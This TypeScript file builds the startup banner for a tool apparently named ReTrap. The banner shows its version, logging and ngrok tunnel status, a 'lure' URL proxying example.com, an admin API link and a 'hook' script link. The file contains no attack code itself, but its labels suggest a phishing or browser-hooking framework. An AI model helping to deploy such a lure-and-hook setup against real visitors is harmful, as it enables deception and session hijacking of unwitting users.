import * as chalk from 'chalk'
import * as Box from 'cli-box'


export const parseWelcomeMessage = (ip:string, port:number, version:string, logging:boolean|string, tunnel:boolean|string) => {
    const link = chalk.blue.underline(tunnel ? tunnel : `http://${ip}:${port}`)
    let lureLink = `${link}/example.com`
    let hookLink = `${link}/fe/guest.js#retrap`
    let apiLink = `${link}/api-doc`
    const marks = {nw: "", n: "", ne: "", e: "", se: "", s: "", sw: "", w: ""}
    const separator = chalk.blue('│                                                                 │\n')
    version = `${version}`
    logging = logging ? 'true ' : 'false'
    tunnel = tunnel ? 'true ' : 'false'

    if (56 > lureLink.length) lureLink = ' '.repeat(56 - lureLink.length) + lureLink
    if (58 > apiLink.length) apiLink = ' '.repeat(58 - apiLink.length) + apiLink
    if (62 > hookLink.length) hookLink = ' '.repeat(62 - hookLink.length) + hookLink
    if (8 > version.length) version = ' '.repeat(8 - version.length) + version
    return Box({marks, fullscreen: true}, chalk.bold(
        chalk.blue(
            '┌─────────────────────────────────────────────────────────────────┐\n' +
            separator +
            '│ 88888888ba         888888888888                                 │\n' +
            `│ 88      "8b             88                                      │\n` +
            '│ 88      ,8P             88                                      │\n' +
            "│ 88aaaaaa8P'  ,adPPYba,  88  8b,dPPYba,  ,adPPYYba,  8b,dPPYba,  │\n" +
            `│ 88""""88'   a8P     88  88  88P'   "Y8  ""      Y8  88P'    "8a │\n` +
            '│ 88    `8b   8PP"""""""  88  88          ,adPPPPP88  88       d8 │\n' +
            '│ 88     `8b  "8b,   ,aa  88  88          88,    ,88  88b,   ,a8" │\n' +
            '│ 88      `8b  `"Ybbd8"   88  88          `"8bbdP"Y8  88`YbbdP"   │\n' +
            '│                                                     88          │\n' +
            '│                                                     88          │\n' +
            separator
        ) + (
            `${chalk.blue('│')}            * You are running version: ${chalk.red.bold(version)}                  ${chalk.blue('│')}\n` +
            `${chalk.blue('│')}            * Server logging's enabled:   ${chalk.red.bold(logging)}                  ${chalk.blue('│')}\n` +
            `${chalk.blue('│')}             * Ngrok tunnel's enabled:   ${chalk.red.bold(tunnel)}                   ${chalk.blue('│')}\n` +
            separator +
            separator +
            `${chalk.blue('│')}  ${chalk.red('[')} Lure's running on:  ${lureLink} ${chalk.red(']')}  ${chalk.blue('│')}\n` +
            `${chalk.blue('│')}   ${chalk.red('[')} Admin API's on:  ${apiLink} ${chalk.red(']')}  ${chalk.blue('│')}\n` +
            `${chalk.blue('│')}  ${chalk.red('[')} Hook's link:  ${hookLink} ${chalk.red(']')}  ${chalk.blue('│')}\n`
        ) + chalk.blue(
            separator +
            '└─────────────────────────────────────────────────────────────────┘\n'
        )
    ))
}
